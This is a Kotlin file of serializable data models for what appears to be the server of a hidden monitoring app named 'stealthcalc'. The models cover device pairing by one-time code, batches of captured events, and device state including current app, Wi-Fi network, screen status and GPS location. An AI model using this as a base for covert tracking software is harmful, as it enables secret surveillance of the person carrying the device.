package com.stealthcalc.server

import kotlinx.serialization.Serializable

@Serializable
data class EventBatch(
    val deviceId: String,
    val events: List<EventPayload>,
)

@Serializable
data class EventPayload(
    val id: String,
    val kind: String,
    val payload: String,
    val capturedAt: Long,
)

@Serializable
data class PairRequest(
    val otp: String,
    val deviceName: String,
)

@Serializable
data class PairResponse(
    val deviceId: String,
    val token: String,
)

@Serializable
data class DeviceState(
    val deviceId: String,
    val deviceName: String,
    val lastSeen: Long,
    val currentApp: String? = null,
    val batteryLevel: Int? = null,
    val isCharging: Boolean? = null,
    val wifiSsid: String? = null,
    val isScreenOn: Boolean? = null,
    val latitude: Double? = null,
    val longitude: Double? = null,
)

@Serializable
data class OtpResponse(
    val otp: String,
    val expiresAt: Long,
)

@Serializable
data class ErrorResponse(
    val error: String,
)
